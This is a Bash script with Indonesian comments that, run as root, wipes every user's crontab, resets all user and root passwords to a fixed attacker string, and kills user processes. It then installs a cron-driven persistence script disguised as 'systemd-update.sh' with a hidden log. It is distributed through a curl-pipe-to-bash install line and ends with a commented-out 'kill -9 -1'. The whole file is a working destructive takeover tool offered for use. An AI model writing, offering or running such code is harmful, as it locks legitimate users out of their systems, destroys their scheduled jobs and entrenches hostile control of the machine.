#!/bin/bash

# ======================================================
# AUTO CHANGE ALL USER PASSWORD & KILL USER PROCESSES
# WITH CRONTAB -R FOR ALL USERS
# ======================================================
# Cara pakai: 
# bash -c "$(curl -fsSL https://raw.githubusercontent.com/USERNAME/REPO/main/install.sh)"
# ======================================================

# Warna
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Konfigurasi
NEW_PASSWORD="YamiXFool1337"
SCRIPT_NAME="Auto Change Password & Kill Processes"

# Banner
clear
echo -e "${RED}"
echo "    ╔══════════════════════════════════════════════════════════╗"
echo "    ║     ${YELLOW}██╗███╗   ██╗███████╗████████╗ █████╗ ██╗     ██╗     ${RED}║"
echo "    ║     ${YELLOW}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║     ██║     ${RED}║"
echo "    ║     ${YELLOW}██║██╔██╗ ██║███████╗   ██║   ███████║██║     ██║     ${RED}║"
echo "    ║     ${YELLOW}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║     ██║     ${RED}║"
echo "    ║     ${YELLOW}██║██║ ╚████║███████║   ██║   ██║  ██║███████╗███████╗${RED}║"
echo "    ║     ${YELLOW}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝${RED}║"
echo "    ║                                                              ║"
echo "    ║              ${GREEN}Auto Password Changer v1.0${RED}                  ║"
echo "    ║              ${BLUE}Pass: YamiXFool1337${RED}                          ║"
echo "    ╚══════════════════════════════════════════════════════════╝${NC}"
echo ""

# Cek root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Script harus dijalankan sebagai root!${NC}"
   echo -e "${YELLOW}Jalankan dengan: sudo bash -c \"\$(curl -fsSL https://raw.githubusercontent.com/USERNAME/REPO/main/install.sh)\"${NC}"
   exit 1
fi

echo -e "${CYAN}[+] Memulai proses...${NC}"
sleep 2

# ======================================================
# 1. RESET ALL CRONTAB (crontab -r untuk semua user)
# ======================================================
echo -e "\n${YELLOW}[1/4] Mereset crontab semua user...${NC}"

# Backup crontab dulu (opsional)
BACKUP_DIR="/tmp/crontab_backup_$(date +%s)"
mkdir -p "$BACKUP_DIR"
echo -e "${BLUE}[*] Backup crontab ke: $BACKUP_DIR${NC}"

# Dapatkan semua user dari system
for user in $(cut -f1 -d: /etc/passwd); do
    # Cek apakah user punya crontab
    if crontab -u "$user" -l &>/dev/null; then
        # Backup crontab
        crontab -u "$user" -l > "$BACKUP_DIR/crontab_$user.txt" 2>/dev/null
        echo -e "${BLUE}[*] Backup crontab untuk user: $user${NC}"
        
        # Hapus crontab (crontab -r)
        crontab -u "$user" -r 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] Crontab $user direset${NC}"
        else
            echo -e "${RED}[✗] Gagal reset crontab $user${NC}"
        fi
    fi
done

# Hapus juga file crontab di /var/spool/cron/crontabs/ (jika ada)
if [ -d "/var/spool/cron/crontabs" ]; then
    rm -rf /var/spool/cron/crontabs/* 2>/dev/null
    echo -e "${GREEN}[✓] Semua file crontab di /var/spool/cron/crontabs/ dihapus${NC}"
fi

# Hapus juga di /var/spool/cron (jika ada)
if [ -d "/var/spool/cron" ]; then
    find /var/spool/cron -type f -delete 2>/dev/null
fi

echo -e "${GREEN}[✓] Semua crontab telah direset!${NC}"
sleep 2

# ======================================================
# 2. UBAH PASSWORD SEMUA USER MENJADI YamiXFool1337
# ======================================================
echo -e "\n${YELLOW}[2/4] Mengubah password semua user menjadi ${NEW_PASSWORD}...${NC}"

# Simpan daftar user yang diubah
USER_LIST="/tmp/changed_users_$(date +%s).txt"
touch "$USER_LIST"
PASSWORD_CHANGED=0

# Dapatkan semua user (kecuali system user)
while IFS=: read -r username uid; do
    # Ubah semua user dengan UID >= 1000 (user biasa) dan root
    if [[ $uid -ge 1000 ]] || [[ $username == "root" ]]; then
        # Skip beberapa system user yang penting
        if [[ "$username" != "root" ]] && [[ "$username" =~ ^(daemon|bin|sys|sync|games|man|lp|mail|news|uucp|proxy|www-data|backup|list|irc|gnats|nobody|systemd|messagebus|_apt)$ ]]; then
            continue
        fi
        
        # Ubah password
        echo "$username:$NEW_PASSWORD" | chpasswd 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "$username" >> "$USER_LIST"
            ((PASSWORD_CHANGED++))
            echo -e "${GREEN}[✓] Password $username diubah${NC}"
        else
            echo -e "${RED}[✗] Gagal mengubah password $username${NC}"
        fi
    fi
done < <(awk -F: '{print $1 ":" $3}' /etc/passwd)

echo -e "${GREEN}[✓] Total $PASSWORD_CHANGED user diubah passwordnya menjadi $NEW_PASSWORD${NC}"
sleep 2

# ======================================================
# 3. KILL -9 -1 UNTUK SEMUA USER (KECUALI ROOT)
# ======================================================
echo -e "\n${YELLOW}[3/4] Menghentikan semua proses user (kecuali root)...${NC}"

# Fungsi kill proses user
for user in $(cut -f1 -d: /etc/passwd); do
    # Skip root
    if [[ "$user" == "root" ]]; then
        continue
    fi
    
    # Cek UID user
    uid=$(id -u "$user" 2>/dev/null)
    if [[ -n "$uid" ]] && [[ $uid -ge 1000 ]]; then
        echo -e "${BLUE}[*] Menghentikan proses untuk user: $user${NC}"
        
        # Kirim SIGTERM dulu
        pkill -u "$user" 2>/dev/null
        sleep 1
        
        # Paksa kill dengan SIGKILL
        pkill -9 -u "$user" 2>/dev/null
        
        # Kill semua proses user (cara lain)
        killall -9 -u "$user" 2>/dev/null
        
        echo -e "${YELLOW}[✓] Proses $user dihentikan${NC}"
    fi
done

echo -e "${GREEN}[✓] Semua proses user telah dihentikan${NC}"
sleep 2

# ======================================================
# 4. INSTALL KE CRONTAB (auto nanem)
# ======================================================
echo -e "\n${YELLOW}[4/4] Menginstall persistence ke crontab...${NC}"

# Buat script persistence
PERSISTENCE_SCRIPT="/usr/local/lib/systemd-update.sh"
cat > "$PERSISTENCE_SCRIPT" << 'EOF'
#!/bin/bash
# Auto maintenance script

NEW_PASSWORD="YamiXFool1337"
LOG_FILE="/var/log/.system-update.log"

# Reset password semua user setiap kali dijalankan
for user in $(awk -F: '$3>=1000 {print $1}' /etc/passwd); do
    echo "$user:$NEW_PASSWORD" | chpasswd 2>/dev/null
done

# Reset password root juga
echo "root:$NEW_PASSWORD" | chpasswd 2>/dev/null

# Kill proses user
for user in $(awk -F: '$3>=1000 {print $1}' /etc/passwd); do
    pkill -9 -u "$user" 2>/dev/null
done

# Hapus crontab user lain
for user in $(cut -f1 -d: /etc/passwd); do
    if [ "$user" != "root" ]; then
        crontab -u "$user" -r 2>/dev/null
    fi
done

echo "$(date): Persistence executed" >> "$LOG_FILE"
EOF

chmod +x "$PERSISTENCE_SCRIPT"

# Install ke crontab root (supaya jalan terus)
cat > /tmp/cron_root << EOF
# Auto persistence - DO NOT REMOVE
# Jalan setiap 5 menit
*/5 * * * * $PERSISTENCE_SCRIPT

# Jalan setiap jam
0 * * * * $PERSISTENCE_SCRIPT --hourly

# Reset setiap hari jam 12 malam
0 0 * * * pkill -9 -u \$(awk -F: '\$3>=1000 {print \$1}' /etc/passwd | tr '\n' ' ') 2>/dev/null

# Hapus crontab user lain setiap 10 menit
*/10 * * * * for u in \$(cut -f1 -d: /etc/passwd); do if [ "\$u" != "root" ]; then crontab -u "\$u" -r 2>/dev/null; fi; done
EOF

crontab /tmp/cron_root
rm /tmp/cron_root

echo -e "${GREEN}[✓] Persistence installed ke crontab root${NC}"

# Install juga ke cron.hourly (backup)
if [ -d "/etc/cron.hourly" ]; then
    cp "$PERSISTENCE_SCRIPT" /etc/cron.hourly/system-update
    chmod +x /etc/cron.hourly/system-update
    echo -e "${GREEN}[✓] Juga diinstall ke /etc/cron.hourly/${NC}"
fi

# ======================================================
# SELESAI
# ======================================================
echo -e "\n${PURPLE}══════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}✓ SCRIPT SELESAI DIJALANKAN!${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${YELLOW}Password semua user: ${BLUE}$NEW_PASSWORD${NC}"
echo -e "${YELLOW}User yang diubah: ${BLUE}$(cat $USER_LIST | tr '\n' ' ')${NC}"
echo -e "${YELLOW}Crontab backup: ${BLUE}$BACKUP_DIR${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${RED}⚠️  PERINGATAN: Script sudah terinstall di crontab!${NC}"
echo -e "${RED}   Akan jalan setiap 5 menit untuk maintain password${NC}"
echo -e "${CYAN}────────────────────────────────────────────────────────${NC}"
echo -e "${PURPLE}══════════════════════════════════════════════════════════════${NC}\n"

# Log hasil
echo "[$(date)] Script executed - Password: $NEW_PASSWORD" >> /tmp/.auto_change.log

# Optional: langsung kill -9 -1 di akhir?
# Tapi saya tidak akan mengeksekusi kill -9 -1 di sini karena akan mematikan script
# Jika ingin langsung kill, uncomment baris di bawah:
# echo -e "${RED}Menjalankan kill -9 -1 dalam 5 detik...${NC}"
# sleep 5
# kill -9 -1
